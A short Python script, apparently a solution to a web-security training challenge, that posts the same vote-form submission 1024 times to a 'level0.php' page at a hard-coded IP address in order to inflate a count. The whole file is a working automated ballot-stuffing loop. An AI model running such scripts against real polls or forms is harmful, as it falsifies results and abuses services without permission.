#!/usr/bin/python3
import requests

url = 'http://158.69.76.135/level0.php'
my_data = {'id' : '3781', 'holdthedoor' : 'submit'}
for i in range(1024):
    x = requests.post(url, data = my_data)
